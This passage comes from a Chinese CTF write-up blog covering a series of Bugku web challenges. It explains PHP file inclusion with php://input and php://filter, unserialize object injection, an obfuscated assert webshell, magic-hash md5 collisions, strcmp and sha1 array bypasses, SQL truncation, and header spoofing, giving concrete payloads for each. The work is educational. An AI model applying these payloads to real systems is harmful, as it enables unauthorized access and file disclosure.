+<p>然后$b的检查长度大于5，正则匹配$b第一位必须为4，然而substr()检查$b第一位不能为4，自相矛盾，但是可以利用%00截断eregi函数</p>
+<p>综上GET参数为?id=0a&amp;a=php://input&amp;b=%0012345</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/55.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h3><p>网址：<a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/</a></p>
+<p>进入页面查看源代码，发现提示了源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>审计后GET参数?txt=php://input，POST数据”welcome to the bugkuctf”</p>
+<p>之后就是文件包含漏洞，提示了hint.php，我们GET参数file=php://filter/read=convert.base64-encode/resource=hint.php查看hint.php的源代码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/56.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>base64解码后得hint.php源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">        	<span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">	        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>又提示了flag.php，猜测flag就在这里面，再试试能不能读取flag.php的源代码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/57.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>貌似被过滤了flag.php</p>
+<p>那就看看index.php的源代码吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/58.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>解码后得：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ä¸è½ç°å¨å°±ç»ä½ flagå¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+<p>果然文件包含被正则匹配过滤了关键词flag，我们要得到flag就必须读取flag.php文件，怎么办呢，想起来还有hint.php的提示，它定义了一个类，类里定义了一个全局变量$file，如果类对象全局变量有设置值，则用file_get_contents函数读取</p>
+<p>这里还有一个password参数经过反序列化函数unserialize处理，首先要了解这个函数具体的作用，来看一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="string">'apple'</span>,<span class="string">'b'</span>=&gt;<span class="string">'banana'</span>,<span class="string">'c'</span>=&gt;<span class="number">40</span>);</span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line">$b = unserialize($s);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">print_r($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/59.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>大概清楚规律了，再看本题，要给参数password赋值一个被序列化的字符串，使password成为Flag类的参数file</p>
+<p>有点难理解，再看一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line">$a -&gt; file = <span class="string">'flag.php'</span>;</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个例子初始化了一个Flag对象a，并赋值’flag.php’，在进行序列化，得到的值就相当于我们给password赋值一个反序列化的Flag对象</p>
+<p>结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/60.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>综上，我们GET参数?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p>POST数据welcome to the bugkuctf</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/61.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功拿到flag</p>
+<p>附上本题参考链接：<a href="https://www.cnblogs.com/Pinging/p/8278168.html" target="_blank" rel="noopener">https://www.cnblogs.com/Pinging/p/8278168.html</a></p>
+<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>网址：<a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p>
+<p>题目给出了提示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);</span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用assert语句执行任意命令</p>
+<p>输入?s=print_r(scandir(‘./‘))</p>
+<p>扫描当前目前下所有文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/62.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>访问<a href="http://120.24.86.145:8010/f94lag.txt" target="_blank" rel="noopener">http://120.24.86.145:8010/f94lag.txt</a> </p>
+<p><img src="/img/Bugkuctf-Web/63.png" alt=""></p>
+<p>获得flag</p>
+<h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><p>网址：<a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/</a></p>
+<p>代码审计题，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>匹配正则输出flag值</p>
+<p>[:punct:]指任意标点符号</p>
+<p>输入?id=keykeykkkkkey:/k/keyk.</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/64.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>获得flag</p>
+<h3 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h3><p>网址：<a href="http://118.89.219.210:49162/" target="_blank" rel="noopener">http://118.89.219.210:49162/</a></p>
+<p>页面源代码给了提示链接</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/65.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>链接是一个code.txt文件，里面给出了提示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>审计代码，熟悉的值不等，md5值相等，240610708和QNKCDZO</p>
+<p>还要绕过strcmp，我们知道strcmp比较两个字符串相等时返回0，否则返回大于0或者小于0，我们要输出flag，必须让strcmp返回0，但是strcmp不能处理数组，会返回NULL</p>
+<p>所以输入：?v1=240610708&amp;v2=QNKCDZO&amp;v3[]</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/66.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>拿到flag</p>
+<h3 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h3><p>网址：<a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">http://118.89.219.210:49163/</a></p>
+<p>一个登陆系统，包含了登陆界面和注册界面，注册用户后登陆发现要管理员账号才能看到flag</p>
+<p>尝试了万能密码等等都不行，猜测是用了mysql_real_escape函数过滤用户输入，怎么办呢，题目给了提示，sql约束攻击，攻击原理我写在了另一篇文章里，这里就直接给出解题过程</p>
+<p>猜测管理员账号是admin，因为注册admin账号，提示admin账号已经存在</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/67.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>注册账号admin          1，(尽量多一点空格)密码自行设置</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/68.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>注册成功来到登录界面，输入账号admin,密码是自行设置的那个密码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/69.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>拿到flag，不行的话注册admin后面的空格再延长一点应该就可以了</p>
+<h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>网址：<a href="http://120.24.86.145:9009/from.php" target="_blank" rel="noopener">http://120.24.86.145:9009/from.php</a></p>
+<p>什么都没有提示，源代码也只有一句话，are you from google</p>
+<p>猜测要从google访问到该页面才能拿到flag</p>
+<p>想起来http请求头的Referer字段值就代表从哪个页面访问到该页面</p>
+<p>尝试一下，用burp抓包，在请求头位置添加一行Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/70.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>果然，拿到了flag</p>
+<h3 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h3><p>网址：<a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a></p>
+<p>md5碰撞，源代码应该是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">	$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">	$md52 = @md5($a);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">        <span class="keyword">if</span>($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"nctf&#123;***&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"please input a"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>php在比较0e开头的字符串时会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
+<p>附上md5加密后以0e开头的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
+<p>输入?a=s878926199a</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/71.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>得到flag</p>
+<h3 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h3><p>网址：<a href="http://120.24.86.145:8002/localhost/" target="_blank" rel="noopener">http://120.24.86.145:8002/localhost/</a></p>
+<p>题目给出提示要我们从本地访问，用burp抓包添加Referer:<a href="http://127.0.0.1，失败" target="_blank" rel="noopener">http://127.0.0.1，失败</a></p>
+<p>想起头部还有一个字段X-Forwarded-For，代表了来源ip地址，添加X-Forwarded-For:127.0.0.1</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/72.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>获得flag</p>
+<h3 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h3><p>网址：<a href="http://120.24.86.145:8002/web7/" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/</a></p>
+<p>一道代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要求我们POST请求提交变量passwd和GET请求提交变量id和变量uname</p>
+<p>变量uname和passwd不能相等但是两者sha1加密后完全相等，我们md5和sha1处理数组会返回NULL，且NULL===NULL，id的话让它等于’margin’就行，url解码还是原来的</p>
+<p>附上payload</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/73.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>拿到flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/74.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>网址：<a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/</a></p>
+<p>代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>extract函数作用是将数组里的键名取出作为新的变量名，键名对应的键值赋值给响应的变量值</p>
+<p>也就是说我们GET的参数ac和fn的值就是变量ac和变量fn的值，题目要求变量ac和变量f完全相等，变量f是变量fn经过file_get_contents得到的值，我们可以利用php://input，让file_get_contents读取字节流</p>
+<p>payloads如下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/75.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/76.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>拿到flag</p>
+<h3 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h3><p>网址：<a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">http://120.24.86.145:8002/web13/</a></p>
+<p>看到提示：想办法变成admin，大概是要以管理员身份访问之类的</p>
+<p>页面伪造了404页面，两个链接也没有什么提示作用，尝试一下访问robots.txt</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/77.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现文件resusl.php</p>
+<p>访问</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/78.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现下面有提示了一行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[x]==$password)</span><br></pre></td></tr></table></figure>
+<p>大概要我们GET一个参数x，要等于变量password的值，想起来刚开始的提示变成admin，就试了一下GET?x=admin</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/79.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>拿到了flag</p>
+<h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>网址：<a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">http://120.24.86.145:8002/web9/</a></p>
